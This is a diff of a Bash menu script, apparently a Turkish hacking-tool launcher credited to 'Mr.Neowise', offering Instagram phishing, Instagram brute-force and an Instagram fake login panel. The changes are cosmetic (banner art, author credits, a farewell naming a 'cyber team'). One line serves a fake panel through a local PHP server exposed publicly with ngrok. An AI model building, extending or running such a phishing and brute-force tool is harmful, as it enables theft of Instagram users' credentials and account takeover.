@@ -1,27 +1,28 @@
 #!/bin/bash|
-#Code: MR.Neowise
+#Code:Mr.Neowise
 #Youtube : Serhat Türk
 
 clear
 
 echo -e '\033[32;40;1m
-       
-███    ██ ███████  ██████  ██     ██ ██ ███████ ███████ 
-████   ██ ██      ██    ██ ██     ██ ██ ██      ██      
-██ ██  ██ █████   ██    ██ ██  █  ██ ██ ███████ █████   
-██  ██ ██ ██      ██    ██ ██ ███ ██ ██      ██ ██      
-██   ████ ███████  ██████   ███ ███  ██ ███████ ███████ 
+
+ __   __     ______     ______     __     __     __     ______     ______    
+/\ "-.\ \   /\  ___\   /\  __ \   /\ \  _ \ \   /\ \   /\  ___\   /\  ___\   
+\ \ \-.  \  \ \  __\   \ \ \/\ \  \ \ \/ ".\ \  \ \ \  \ \___  \  \ \  __\   
+ \ \_\\"\_\  \ \_____\  \ \_____\  \ \__/".~\_\  \ \_\  \/\_____\  \ \_____\ 
+  \/_/ \/_/   \/_____/   \/_____/   \/_/   \/_/   \/_/   \/_____/   \/_____/ 
+                                                                             
+
+
 
 
 echo -e "\033[31;40;1m
 \033[31;40;1m[01]\e[37mİnstagram Phishing          \033[31;40;1m[02]\e[37mİnstagram Brute-Force
 \033[31;40;1m[03]\e[37mİnstagram Fake Panel
-
-
 \e[31m[00]\e[37m Menü
 \e[31m[99]\e[37m Exit
 "
-echo -e "\033[32;40;1m                      ~~~Mr.Neowise~~~"
+echo -e "\033[32;40;1m                      ~~~Coder Neowise~~~"
 echo ""
 read -p "İslem Numarası : " islem
 if [[ $islem == 1 || $islem == 01 ]]; then
@@ -52,7 +53,7 @@ elif [[ $islem == 3 || $islem == 03 ]]; then
 	php -S 127.0.0.1:$port > -t & ngrok http $port
 	elif [[ $islem == 9 || $islem == 99 ]]; then
 	clear
-	echo -e "\e[31mMr.Neowise İyi Günler Diler :)) ßß"
+	echo -e "\e[31mTürk Siber Timi İyi Günler Diler :)) ßß"
 	sleep 1 
 	exit 1
 elif [[ $islem == 00 ]]; then
